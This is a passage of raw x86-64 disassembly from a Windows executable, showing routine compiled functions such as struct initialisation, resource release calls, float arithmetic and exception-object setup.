   14000201d:	48 c7 83 80 4a 00 00 	movq   $0xffffffffffffffff,0x4a80(%rbx)
   140002024:	ff ff ff ff 
   140002028:	48 89 ab d8 4a 00 00 	mov    %rbp,0x4ad8(%rbx)
   14000202f:	48 89 ab e0 4a 00 00 	mov    %rbp,0x4ae0(%rbx)
   140002036:	89 ab e8 4a 00 00    	mov    %ebp,0x4ae8(%rbx)
   14000203c:	c7 83 ec 4a 00 00 ff 	movl   $0xffffffff,0x4aec(%rbx)
   140002043:	ff ff ff 
   140002046:	89 ab f0 4a 00 00    	mov    %ebp,0x4af0(%rbx)
   14000204c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000204f:	0f 11 83 08 4b 00 00 	movups %xmm0,0x4b08(%rbx)
   140002056:	89 ab 18 4b 00 00    	mov    %ebp,0x4b18(%rbx)
   14000205c:	48 89 ab 30 4b 00 00 	mov    %rbp,0x4b30(%rbx)
   140002063:	89 ab 38 4b 00 00    	mov    %ebp,0x4b38(%rbx)
   140002069:	48 89 ab 98 4b 00 00 	mov    %rbp,0x4b98(%rbx)
   140002070:	48 89 ab f8 4b 00 00 	mov    %rbp,0x4bf8(%rbx)
   140002077:	48 89 ab e8 4b 00 00 	mov    %rbp,0x4be8(%rbx)
   14000207e:	48 89 ab f0 4b 00 00 	mov    %rbp,0x4bf0(%rbx)
   140002085:	48 89 ab 00 4c 00 00 	mov    %rbp,0x4c00(%rbx)
   14000208c:	89 ab 08 4c 00 00    	mov    %ebp,0x4c08(%rbx)
   140002092:	89 ab 38 5b 00 00    	mov    %ebp,0x5b38(%rbx)
   140002098:	48 c7 83 3c 5b 00 00 	movq   $0xa900000,0x5b3c(%rbx)
   14000209f:	00 00 90 0a 
   1400020a3:	48 89 ab 44 5b 00 00 	mov    %rbp,0x5b44(%rbx)
   1400020aa:	48 89 ab 4c 5b 00 00 	mov    %rbp,0x5b4c(%rbx)
   1400020b1:	48 89 ab 94 5b 00 00 	mov    %rbp,0x5b94(%rbx)
   1400020b8:	66 c7 83 9c 5b 00 00 	movw   $0x0,0x5b9c(%rbx)
   1400020bf:	00 00 
   1400020c1:	89 ab a0 5b 00 00    	mov    %ebp,0x5ba0(%rbx)
   1400020c7:	48 c7 83 a4 5b 00 00 	movq   $0x3c23d70a,0x5ba4(%rbx)
   1400020ce:	0a d7 23 3c 
   1400020d2:	48 89 ab ac 5b 00 00 	mov    %rbp,0x5bac(%rbx)
   1400020d9:	48 89 ab dc 5b 00 00 	mov    %rbp,0x5bdc(%rbx)
   1400020e0:	c7 83 ec 5b 00 00 00 	movl   $0xbf800000,0x5bec(%rbx)
   1400020e7:	00 80 bf 
   1400020ea:	c7 83 f0 5b 00 00 00 	movl   $0xbf800000,0x5bf0(%rbx)
   1400020f1:	00 80 bf 
   1400020f4:	66 c7 83 f8 5b 00 00 	movw   $0x2e,0x5bf8(%rbx)
   1400020fb:	2e 00 
   1400020fd:	89 ab fc 5b 00 00    	mov    %ebp,0x5bfc(%rbx)
   140002103:	89 ab 50 5c 00 00    	mov    %ebp,0x5c50(%rbx)
   140002109:	0f 11 83 58 5c 00 00 	movups %xmm0,0x5c58(%rbx)
   140002110:	0f 11 83 68 5c 00 00 	movups %xmm0,0x5c68(%rbx)
   140002117:	0f 11 83 78 5c 00 00 	movups %xmm0,0x5c78(%rbx)
   14000211e:	0f 11 83 88 5c 00 00 	movups %xmm0,0x5c88(%rbx)
   140002125:	c6 83 98 5c 00 00 00 	movb   $0x0,0x5c98(%rbx)
   14000212c:	89 ab 9c 5c 00 00    	mov    %ebp,0x5c9c(%rbx)
   140002132:	48 89 ab c0 5c 00 00 	mov    %rbp,0x5cc0(%rbx)
   140002139:	48 89 ab b8 5c 00 00 	mov    %rbp,0x5cb8(%rbx)
   140002140:	48 89 ab a0 5c 00 00 	mov    %rbp,0x5ca0(%rbx)
   140002147:	c7 83 c8 5c 00 00 ff 	movl   $0x7f7fffff,0x5cc8(%rbx)
   14000214e:	ff 7f 7f 
   140002151:	c6 83 cc 5c 00 00 00 	movb   $0x0,0x5ccc(%rbx)
   140002158:	89 ab d0 5c 00 00    	mov    %ebp,0x5cd0(%rbx)
   14000215e:	c7 83 d8 5c 00 00 02 	movl   $0x2,0x5cd8(%rbx)
   140002165:	00 00 00 
   140002168:	c7 83 d4 5c 00 00 02 	movl   $0x2,0x5cd4(%rbx)
   14000216f:	00 00 00 
   140002172:	c7 83 dc 5c 00 00 00 	movl   $0x400,0x5cdc(%rbx)
   140002179:	04 00 00 
   14000217c:	89 ab 5c 47 00 00    	mov    %ebp,0x475c(%rbx)
   140002182:	c7 83 08 5d 00 00 00 	movl   $0xff0000,0x5d08(%rbx)
   140002189:	00 ff 00 
   14000218c:	c6 83 0c 5d 00 00 00 	movb   $0x0,0x5d0c(%rbx)
   140002193:	89 ab 10 5d 00 00    	mov    %ebp,0x5d10(%rbx)
   140002199:	48 8d 8b 50 5d 00 00 	lea    0x5d50(%rbx),%rcx
   1400021a0:	33 d2                	xor    %edx,%edx
   1400021a2:	41 b8 f0 00 00 00    	mov    $0xf0,%r8d
   1400021a8:	e8 07 d5 03 00       	call   0x14003f6b4
   1400021ad:	48 89 ab 40 5e 00 00 	mov    %rbp,0x5e40(%rbx)
   1400021b4:	89 ab 48 5e 00 00    	mov    %ebp,0x5e48(%rbx)
   1400021ba:	48 c7 83 50 5e 00 00 	movq   $0xffffffffffffffff,0x5e50(%rbx)
   1400021c1:	ff ff ff ff 
   1400021c5:	c7 83 4c 5e 00 00 ff 	movl   $0xffffffff,0x5e4c(%rbx)
   1400021cc:	ff ff ff 
   1400021cf:	48 8b c3             	mov    %rbx,%rax
   1400021d2:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   1400021d7:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1400021db:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1400021df:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
   1400021e4:	0f 28 7c 24 30       	movaps 0x30(%rsp),%xmm7
   1400021e9:	45 0f 28 43 d0       	movaps -0x30(%r11),%xmm8
   1400021ee:	49 8b e3             	mov    %r11,%rsp
   1400021f1:	41 5e                	pop    %r14
   1400021f3:	5f                   	pop    %rdi
   1400021f4:	5e                   	pop    %rsi
   1400021f5:	c3                   	ret
   1400021f6:	cc                   	int3
   1400021f7:	cc                   	int3
   1400021f8:	cc                   	int3
   1400021f9:	cc                   	int3
   1400021fa:	cc                   	int3
   1400021fb:	cc                   	int3
   1400021fc:	cc                   	int3
   1400021fd:	cc                   	int3
   1400021fe:	cc                   	int3
   1400021ff:	cc                   	int3
   140002200:	48 83 ec 28          	sub    $0x28,%rsp
   140002204:	48 8b 89 b8 37 00 00 	mov    0x37b8(%rcx),%rcx
   14000220b:	48 85 c9             	test   %rcx,%rcx
   14000220e:	74 19                	je     0x140002229
   140002210:	48 8b 05 e9 d5 04 00 	mov    0x4d5e9(%rip),%rax        # 0x14004f800
   140002217:	48 85 c0             	test   %rax,%rax
   14000221a:	74 06                	je     0x140002222
   14000221c:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140002222:	ff 15 d8 f1 03 00    	call   *0x3f1d8(%rip)        # 0x140041400
   140002228:	90                   	nop
   140002229:	48 83 c4 28          	add    $0x28,%rsp
   14000222d:	c3                   	ret
   14000222e:	cc                   	int3
   14000222f:	cc                   	int3
   140002230:	48 83 ec 28          	sub    $0x28,%rsp
   140002234:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   140002238:	48 85 c9             	test   %rcx,%rcx
   14000223b:	74 19                	je     0x140002256
   14000223d:	48 8b 05 bc d5 04 00 	mov    0x4d5bc(%rip),%rax        # 0x14004f800
   140002244:	48 85 c0             	test   %rax,%rax
   140002247:	74 06                	je     0x14000224f
   140002249:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   14000224f:	ff 15 ab f1 03 00    	call   *0x3f1ab(%rip)        # 0x140041400
   140002255:	90                   	nop
   140002256:	48 83 c4 28          	add    $0x28,%rsp
   14000225a:	c3                   	ret
   14000225b:	cc                   	int3
   14000225c:	cc                   	int3
   14000225d:	cc                   	int3
   14000225e:	cc                   	int3
   14000225f:	cc                   	int3
   140002260:	48 83 ec 28          	sub    $0x28,%rsp
   140002264:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140002268:	48 85 c9             	test   %rcx,%rcx
   14000226b:	74 19                	je     0x140002286
   14000226d:	48 8b 05 8c d5 04 00 	mov    0x4d58c(%rip),%rax        # 0x14004f800
   140002274:	48 85 c0             	test   %rax,%rax
   140002277:	74 06                	je     0x14000227f
   140002279:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   14000227f:	ff 15 7b f1 03 00    	call   *0x3f17b(%rip)        # 0x140041400
   140002285:	90                   	nop
   140002286:	48 83 c4 28          	add    $0x28,%rsp
   14000228a:	c3                   	ret
   14000228b:	cc                   	int3
   14000228c:	cc                   	int3
   14000228d:	cc                   	int3
   14000228e:	cc                   	int3
   14000228f:	cc                   	int3
   140002290:	40 53                	rex push %rbx
   140002292:	48 83 ec 20          	sub    $0x20,%rsp
   140002296:	48 8b d9             	mov    %rcx,%rbx
   140002299:	48 8b 89 30 01 00 00 	mov    0x130(%rcx),%rcx
   1400022a0:	48 85 c9             	test   %rcx,%rcx
   1400022a3:	74 19                	je     0x1400022be
   1400022a5:	48 8b 05 54 d5 04 00 	mov    0x4d554(%rip),%rax        # 0x14004f800
   1400022ac:	48 85 c0             	test   %rax,%rax
   1400022af:	74 06                	je     0x1400022b7
   1400022b1:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   1400022b7:	ff 15 43 f1 03 00    	call   *0x3f143(%rip)        # 0x140041400
   1400022bd:	90                   	nop
   1400022be:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   1400022c5:	48 85 c9             	test   %rcx,%rcx
   1400022c8:	74 19                	je     0x1400022e3
   1400022ca:	48 8b 05 2f d5 04 00 	mov    0x4d52f(%rip),%rax        # 0x14004f800
   1400022d1:	48 85 c0             	test   %rax,%rax
   1400022d4:	74 06                	je     0x1400022dc
   1400022d6:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   1400022dc:	ff 15 1e f1 03 00    	call   *0x3f11e(%rip)        # 0x140041400
   1400022e2:	90                   	nop
   1400022e3:	48 83 c4 20          	add    $0x20,%rsp
   1400022e7:	5b                   	pop    %rbx
   1400022e8:	c3                   	ret
   1400022e9:	cc                   	int3
   1400022ea:	cc                   	int3
   1400022eb:	cc                   	int3
   1400022ec:	cc                   	int3
   1400022ed:	cc                   	int3
   1400022ee:	cc                   	int3
   1400022ef:	cc                   	int3
   1400022f0:	40 53                	rex push %rbx
   1400022f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400022f6:	48 8b d9             	mov    %rcx,%rbx
   1400022f9:	48 8b 49 40          	mov    0x40(%rcx),%rcx
   1400022fd:	48 85 c9             	test   %rcx,%rcx
   140002300:	74 19                	je     0x14000231b
   140002302:	48 8b 05 f7 d4 04 00 	mov    0x4d4f7(%rip),%rax        # 0x14004f800
   140002309:	48 85 c0             	test   %rax,%rax
   14000230c:	74 06                	je     0x140002314
   14000230e:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140002314:	ff 15 e6 f0 03 00    	call   *0x3f0e6(%rip)        # 0x140041400
   14000231a:	90                   	nop
   14000231b:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000231f:	48 85 c9             	test   %rcx,%rcx
   140002322:	74 19                	je     0x14000233d
   140002324:	48 8b 05 d5 d4 04 00 	mov    0x4d4d5(%rip),%rax        # 0x14004f800
   14000232b:	48 85 c0             	test   %rax,%rax
   14000232e:	74 06                	je     0x140002336
   140002330:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140002336:	ff 15 c4 f0 03 00    	call   *0x3f0c4(%rip)        # 0x140041400
   14000233c:	90                   	nop
   14000233d:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140002341:	48 85 c9             	test   %rcx,%rcx
   140002344:	74 19                	je     0x14000235f
   140002346:	48 8b 05 b3 d4 04 00 	mov    0x4d4b3(%rip),%rax        # 0x14004f800
   14000234d:	48 85 c0             	test   %rax,%rax
   140002350:	74 06                	je     0x140002358
   140002352:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   140002358:	ff 15 a2 f0 03 00    	call   *0x3f0a2(%rip)        # 0x140041400
   14000235e:	90                   	nop
   14000235f:	48 83 c4 20          	add    $0x20,%rsp
   140002363:	5b                   	pop    %rbx
   140002364:	c3                   	ret
   140002365:	cc                   	int3
   140002366:	cc                   	int3
   140002367:	cc                   	int3
   140002368:	cc                   	int3
   140002369:	cc                   	int3
   14000236a:	cc                   	int3
   14000236b:	cc                   	int3
   14000236c:	cc                   	int3
   14000236d:	cc                   	int3
   14000236e:	cc                   	int3
   14000236f:	cc                   	int3
   140002370:	48 83 ec 28          	sub    $0x28,%rsp
   140002374:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140002378:	48 85 c9             	test   %rcx,%rcx
   14000237b:	74 19                	je     0x140002396
   14000237d:	48 8b 05 7c d4 04 00 	mov    0x4d47c(%rip),%rax        # 0x14004f800
   140002384:	48 85 c0             	test   %rax,%rax
   140002387:	74 06                	je     0x14000238f
   140002389:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   14000238f:	ff 15 6b f0 03 00    	call   *0x3f06b(%rip)        # 0x140041400
   140002395:	90                   	nop
   140002396:	48 83 c4 28          	add    $0x28,%rsp
   14000239a:	c3                   	ret
   14000239b:	cc                   	int3
   14000239c:	cc                   	int3
   14000239d:	cc                   	int3
   14000239e:	cc                   	int3
   14000239f:	cc                   	int3
   1400023a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400023a4:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400023a8:	48 85 c9             	test   %rcx,%rcx
   1400023ab:	74 19                	je     0x1400023c6
   1400023ad:	48 8b 05 4c d4 04 00 	mov    0x4d44c(%rip),%rax        # 0x14004f800
   1400023b4:	48 85 c0             	test   %rax,%rax
   1400023b7:	74 06                	je     0x1400023bf
   1400023b9:	ff 88 ec 00 00 00    	decl   0xec(%rax)
   1400023bf:	ff 15 3b f0 03 00    	call   *0x3f03b(%rip)        # 0x140041400
   1400023c5:	90                   	nop
   1400023c6:	48 83 c4 28          	add    $0x28,%rsp
   1400023ca:	c3                   	ret
   1400023cb:	cc                   	int3
   1400023cc:	cc                   	int3
   1400023cd:	cc                   	int3
   1400023ce:	cc                   	int3
   1400023cf:	cc                   	int3
   1400023d0:	44 8b 49 14          	mov    0x14(%rcx),%r9d
   1400023d4:	0f 57 d2             	xorps  %xmm2,%xmm2
   1400023d7:	48 8b 01             	mov    (%rcx),%rax
   1400023da:	41 f6 c1 01          	test   $0x1,%r9b
   1400023de:	74 0c                	je     0x1400023ec
   1400023e0:	0f 57 db             	xorps  %xmm3,%xmm3
   1400023e3:	4c 8d 80 08 38 00 00 	lea    0x3808(%rax),%r8
   1400023ea:	eb 39                	jmp    0x140002425
   1400023ec:	4c 8b 81 68 03 00 00 	mov    0x368(%rcx),%r8
   1400023f3:	f3 0f 10 80 14 3c 00 	movss  0x3c14(%rax),%xmm0
   1400023fa:	00 
   1400023fb:	f3 0f 59 81 90 02 00 	mulss  0x290(%rcx),%xmm0
   140002402:	00 
   140002403:	4d 85 c0             	test   %r8,%r8
   140002406:	74 09                	je     0x140002411
   140002408:	f3 41 0f 59 80 90 02 	mulss  0x290(%r8),%xmm0
   14000240f:	00 00 
   140002411:	4c 8d 80 08 38 00 00 	lea    0x3808(%rax),%r8
   140002418:	f3 41 0f 10 18       	movss  (%r8),%xmm3
   14000241d:	f3 0f 58 db          	addss  %xmm3,%xmm3
   140002421:	f3 0f 58 d8          	addss  %xmm0,%xmm3
   140002425:	f3 0f 58 59 24       	addss  0x24(%rcx),%xmm3
   14000242a:	41 0f ba e1 0a       	bt     $0xa,%r9d
   14000242f:	73 39                	jae    0x14000246a
   140002431:	f3 0f 10 91 90 02 00 	movss  0x290(%rcx),%xmm2
   140002438:	00 
   140002439:	f3 0f 59 90 14 3c 00 	mulss  0x3c14(%rax),%xmm2
   140002440:	00 
   140002441:	48 8b 81 68 03 00 00 	mov    0x368(%rcx),%rax
   140002448:	48 85 c0             	test   %rax,%rax
   14000244b:	74 08                	je     0x140002455
   14000244d:	f3 0f 59 90 90 02 00 	mulss  0x290(%rax),%xmm2
   140002454:	00 
   140002455:	f3 41 0f 10 00       	movss  (%r8),%xmm0
   14000245a:	f3 0f 58 91 68 01 00 	addss  0x168(%rcx),%xmm2
   140002461:	00 
   140002462:	f3 0f 58 c0          	addss  %xmm0,%xmm0
   140002466:	f3 0f 58 d0          	addss  %xmm0,%xmm2
   14000246a:	f3 0f 10 41 20       	movss  0x20(%rcx),%xmm0
   14000246f:	f3 0f 58 d3          	addss  %xmm3,%xmm2
   140002473:	0f 28 c8             	movaps %xmm0,%xmm1
   140002476:	48 8b c2             	mov    %rdx,%rax
   140002479:	f3 0f 58 49 30       	addss  0x30(%rcx),%xmm1
   14000247e:	f3 0f 11 02          	movss  %xmm0,(%rdx)
   140002482:	f3 0f 11 5a 04       	movss  %xmm3,0x4(%rdx)
   140002487:	f3 0f 11 52 0c       	movss  %xmm2,0xc(%rdx)
   14000248c:	f3 0f 11 4a 08       	movss  %xmm1,0x8(%rdx)
   140002491:	c3                   	ret
   140002492:	cc                   	int3
   140002493:	cc                   	int3
   140002494:	cc                   	int3
   140002495:	cc                   	int3
   140002496:	cc                   	int3
   140002497:	cc                   	int3
   140002498:	cc                   	int3
   140002499:	cc                   	int3
   14000249a:	cc                   	int3
   14000249b:	cc                   	int3
   14000249c:	cc                   	int3
   14000249d:	cc                   	int3
   14000249e:	cc                   	int3
   14000249f:	cc                   	int3
   1400024a0:	4c 8b c1             	mov    %rcx,%r8
   1400024a3:	f7 c2 00 f8 00 00    	test   $0xf800,%edx
   1400024a9:	74 57                	je     0x140002502
   1400024ab:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
   1400024b1:	75 07                	jne    0x1400024ba
   1400024b3:	ba 88 02 00 00       	mov    $0x288,%edx
   1400024b8:	eb 48                	jmp    0x140002502
   1400024ba:	81 fa 00 20 00 00    	cmp    $0x2000,%edx
   1400024c0:	75 07                	jne    0x1400024c9
   1400024c2:	ba 89 02 00 00       	mov    $0x289,%edx
   1400024c7:	eb 39                	jmp    0x140002502
   1400024c9:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
   1400024cf:	75 07                	jne    0x1400024d8
   1400024d1:	ba 8a 02 00 00       	mov    $0x28a,%edx
   1400024d6:	eb 2a                	jmp    0x140002502
   1400024d8:	81 fa 00 80 00 00    	cmp    $0x8000,%edx
   1400024de:	75 07                	jne    0x1400024e7
   1400024e0:	ba 8b 02 00 00       	mov    $0x28b,%edx
   1400024e5:	eb 1b                	jmp    0x140002502
   1400024e7:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   1400024ed:	75 13                	jne    0x140002502
   1400024ef:	80 79 59 00          	cmpb   $0x0,0x59(%rcx)
   1400024f3:	ba 8b 02 00 00       	mov    $0x28b,%edx
   1400024f8:	b8 88 02 00 00       	mov    $0x288,%eax
   1400024fd:	0f 45 c2             	cmovne %edx,%eax
   140002500:	8b d0                	mov    %eax,%edx
   140002502:	8d 82 00 fe ff ff    	lea    -0x200(%rdx),%eax
   140002508:	48 63 c8             	movslq %eax,%rcx
   14000250b:	48 8d 81 f0 07 00 00 	lea    0x7f0(%rcx),%rax
   140002512:	48 8d 04 41          	lea    (%rcx,%rax,2),%rax
   140002516:	49 8d 04 80          	lea    (%r8,%rax,4),%rax
   14000251a:	c3                   	ret
   14000251b:	cc                   	int3
   14000251c:	cc                   	int3
   14000251d:	cc                   	int3
   14000251e:	cc                   	int3
   14000251f:	cc                   	int3
   140002520:	40 53                	rex push %rbx
   140002522:	48 83 ec 20          	sub    $0x20,%rsp
   140002526:	48 8b d9             	mov    %rcx,%rbx
   140002529:	48 8b c2             	mov    %rdx,%rax
   14000252c:	48 8d 0d 35 f2 03 00 	lea    0x3f235(%rip),%rcx        # 0x140041768
   140002533:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002536:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000253a:	48 89 0b             	mov    %rcx,(%rbx)
   14000253d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002541:	0f 11 02             	movups %xmm0,(%rdx)
   140002544:	ff 15 3e ee 03 00    	call   *0x3ee3e(%rip)        # 0x140041388
   14000254a:	48 8b c3             	mov    %rbx,%rax
   14000254d:	48 83 c4 20          	add    $0x20,%rsp
   140002551:	5b                   	pop    %rbx
   140002552:	c3                   	ret
   140002553:	cc                   	int3
   140002554:	cc                   	int3
   140002555:	cc                   	int3
   140002556:	cc                   	int3
   140002557:	cc                   	int3
   140002558:	cc                   	int3
   140002559:	cc                   	int3
   14000255a:	cc                   	int3
   14000255b:	cc                   	int3
   14000255c:	cc                   	int3
   14000255d:	cc                   	int3
   14000255e:	cc                   	int3
   14000255f:	cc                   	int3
   140002560:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140002564:	48 8d 05 5d f2 03 00 	lea    0x3f25d(%rip),%rax        # 0x1400417c8
   14000256b:	48 85 d2             	test   %rdx,%rdx
   14000256e:	48 0f 45 c2          	cmovne %rdx,%rax
   140002572:	c3                   	ret
   140002573:	cc                   	int3
   140002574:	cc                   	int3
   140002575:	cc                   	int3
   140002576:	cc                   	int3
   140002577:	cc                   	int3
   140002578:	cc                   	int3
   140002579:	cc                   	int3
   14000257a:	cc                   	int3
   14000257b:	cc                   	int3
   14000257c:	cc                   	int3
   14000257d:	cc                   	int3
   14000257e:	cc                   	int3
   14000257f:	cc                   	int3
   140002580:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002585:	57                   	push   %rdi
   140002586:	48 83 ec 20          	sub    $0x20,%rsp
   14000258a:	48 8d 05 d7 f1 03 00 	lea    0x3f1d7(%rip),%rax        # 0x140041768
   140002591:	48 8b f9             	mov    %rcx,%rdi
   140002594:	48 89 01             	mov    %rax,(%rcx)
   140002597:	8b da                	mov    %edx,%ebx
   140002599:	48 83 c1 08          	add    $0x8,%rcx
   14000259d:	ff 15 ed ed 03 00    	call   *0x3eded(%rip)        # 0x140041390
   1400025a3:	f6 c3 01             	test   $0x1,%bl
   1400025a6:	74 0d                	je     0x1400025b5
   1400025a8:	ba 18 00 00 00       	mov    $0x18,%edx
   1400025ad:	48 8b cf             	mov    %rdi,%rcx
   1400025b0:	e8 fb c3 03 00       	call   0x14003e9b0
   1400025b5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400025ba:	48 8b c7             	mov    %rdi,%rax
   1400025bd:	48 83 c4 20          	add    $0x20,%rsp
   1400025c1:	5f                   	pop    %rdi
   1400025c2:	c3                   	ret
   1400025c3:	cc                   	int3
   1400025c4:	cc                   	int3
   1400025c5:	cc                   	int3
   1400025c6:	cc                   	int3
   1400025c7:	cc                   	int3
   1400025c8:	cc                   	int3
   1400025c9:	cc                   	int3
   1400025ca:	cc                   	int3
   1400025cb:	cc                   	int3
   1400025cc:	cc                   	int3
   1400025cd:	cc                   	int3
   1400025ce:	cc                   	int3
   1400025cf:	cc                   	int3
   1400025d0:	48 8d 05 91 f1 03 00 	lea    0x3f191(%rip),%rax        # 0x140041768
   1400025d7:	48 89 01             	mov    %rax,(%rcx)
   1400025da:	48 83 c1 08          	add    $0x8,%rcx
   1400025de:	48 ff 25 ab ed 03 00 	rex.W jmp *0x3edab(%rip)        # 0x140041390
   1400025e5:	cc                   	int3
   1400025e6:	cc                   	int3
   1400025e7:	cc                   	int3
   1400025e8:	cc                   	int3
   1400025e9:	cc                   	int3
   1400025ea:	cc                   	int3
   1400025eb:	cc                   	int3
   1400025ec:	cc                   	int3
   1400025ed:	cc                   	int3
   1400025ee:	cc                   	int3
   1400025ef:	cc                   	int3
   1400025f0:	48 8d 05 e9 f1 03 00 	lea    0x3f1e9(%rip),%rax        # 0x1400417e0
   1400025f7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400025fe:	00 
   1400025ff:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002603:	48 8d 05 9e f1 03 00 	lea    0x3f19e(%rip),%rax        # 0x1400417a8
   14000260a:	48 89 01             	mov    %rax,(%rcx)
   14000260d:	48 8b c1             	mov    %rcx,%rax
   140002610:	c3                   	ret
   140002611:	cc                   	int3
   140002612:	cc                   	int3
   140002613:	cc                   	int3
   140002614:	cc                   	int3
   140002615:	cc                   	int3
   140002616:	cc                   	int3
   140002617:	cc                   	int3
   140002618:	cc                   	int3
   140002619:	cc                   	int3
   14000261a:	cc                   	int3
   14000261b:	cc                   	int3
   14000261c:	cc                   	int3
   14000261d:	cc                   	int3
   14000261e:	cc                   	int3
   14000261f:	cc                   	int3
   140002620:	48 83 ec 48          	sub    $0x48,%rsp
   140002624:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002629:	e8 c2 ff ff ff       	call   0x1400025f0
   14000262e:	48 8d 15 83 b0 04 00 	lea    0x4b083(%rip),%rdx        # 0x14004d6b8
   140002635:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000263a:	e8 6f d0 03 00       	call   0x14003f6ae
   14000263f:	cc                   	int3
   140002640:	40 53                	rex push %rbx
   140002642:	48 83 ec 20          	sub    $0x20,%rsp
   140002646:	48 8b d9             	mov    %rcx,%rbx
   140002649:	48 8b c2             	mov    %rdx,%rax
   14000264c:	48 8d 0d 15 f1 03 00 	lea    0x3f115(%rip),%rcx        # 0x140041768
   140002653:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002656:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000265a:	48 89 0b             	mov    %rcx,(%rbx)
   14000265d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002661:	0f 11 02             	movups %xmm0,(%rdx)
   140002664:	ff 15 1e ed 03 00    	call   *0x3ed1e(%rip)        # 0x140041388
   14000266a:	48 8d 05 37 f1 03 00 	lea    0x3f137(%rip),%rax        # 0x1400417a8
   140002671:	48 89 03             	mov    %rax,(%rbx)
   140002674:	48 8b c3             	mov    %rbx,%rax
   140002677:	48 83 c4 20          	add    $0x20,%rsp
   14000267b:	5b                   	pop    %rbx
   14000267c:	c3                   	ret
   14000267d:	cc                   	int3
   14000267e:	cc                   	int3
   14000267f:	cc                   	int3
   140002680:	40 53                	rex push %rbx
   140002682:	48 83 ec 20          	sub    $0x20,%rsp
   140002686:	48 8b d9             	mov    %rcx,%rbx
   140002689:	48 8b c2             	mov    %rdx,%rax
   14000268c:	48 8d 0d d5 f0 03 00 	lea    0x3f0d5(%rip),%rcx        # 0x140041768
   140002693:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002696:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000269a:	48 89 0b             	mov    %rcx,(%rbx)
   14000269d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400026a1:	0f 11 02             	movups %xmm0,(%rdx)
   1400026a4:	ff 15 de ec 03 00    	call   *0x3ecde(%rip)        # 0x140041388
   1400026aa:	48 8d 05 cf f0 03 00 	lea    0x3f0cf(%rip),%rax        # 0x140041780
   1400026b1:	48 89 03             	mov    %rax,(%rbx)
   1400026b4:	48 8b c3             	mov    %rbx,%rax
   1400026b7:	48 83 c4 20          	add    $0x20,%rsp
   1400026bb:	5b                   	pop    %rbx
   1400026bc:	c3                   	ret
   1400026bd:	cc                   	int3
   1400026be:	cc                   	int3
   1400026bf:	cc                   	int3
   1400026c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400026c4:	48 8d 0d 2d f1 03 00 	lea    0x3f12d(%rip),%rcx        # 0x1400417f8
   1400026cb:	ff 15 67 eb 03 00    	call   *0x3eb67(%rip)        # 0x140041238
   1400026d1:	cc                   	int3
   1400026d2:	cc                   	int3
   1400026d3:	cc                   	int3
   1400026d4:	cc                   	int3
   1400026d5:	cc                   	int3
   1400026d6:	cc                   	int3
   1400026d7:	cc                   	int3
   1400026d8:	cc                   	int3
   1400026d9:	cc                   	int3
   1400026da:	cc                   	int3
   1400026db:	cc                   	int3
   1400026dc:	cc                   	int3
   1400026dd:	cc                   	int3
   1400026de:	cc                   	int3
   1400026df:	cc                   	int3
   1400026e0:	40 53                	rex push %rbx
   1400026e2:	48 83 ec 60          	sub    $0x60,%rsp
   1400026e6:	48 8b 05 53 c9 04 00 	mov    0x4c953(%rip),%rax        # 0x14004f040
   1400026ed:	48 33 c4             	xor    %rsp,%rax
   1400026f0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400026f5:	80 3d e4 d0 04 00 00 	cmpb   $0x0,0x4d0e4(%rip)        # 0x14004f7e0
   1400026fc:	48 8b d9             	mov    %rcx,%rbx
   1400026ff:	0f 85 2c 01 00 00    	jne    0x140002831
   140002705:	b9 00 01 00 00       	mov    $0x100,%ecx
   14000270a:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140002711:	00 00 
   140002713:	e8 94 c1 03 00       	call   0x14003e8ac
   140002718:	66 0f 6f 05 40 5c 04 	movdqa 0x45c40(%rip),%xmm0        # 0x140048360
   14000271f:	00 
   140002720:	48 8d 0d e9 f0 03 00 	lea    0x3f0e9(%rip),%rcx        # 0x140041810
   140002727:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   14000272d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002732:	4c 8b c0             	mov    %rax,%r8
   140002735:	0f 10 01             	movups (%rcx),%xmm0
